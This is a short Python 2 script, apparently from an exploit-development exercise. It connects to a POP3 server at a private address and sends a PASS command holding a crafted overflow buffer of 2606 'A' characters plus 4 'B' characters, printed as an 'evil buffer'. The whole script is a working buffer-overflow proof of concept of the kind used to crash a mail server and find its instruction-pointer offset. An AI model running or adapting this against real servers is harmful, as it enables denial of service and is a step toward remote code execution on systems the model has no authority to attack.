import struct

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buff = "A" * 2606 + "B" * 4

try:

	print "\nSending evil buffer..."

	s.connect(('192.168.1.8',110))

	data = s.recv(1024)

	s.send('USER username' +'\r\n')

	data = s.recv(1024)

	s.send('PASS ' + buff + '\r\n')

	data = s.recv(1024)

	s.close()

except:

	print "Could not connect to POP3!"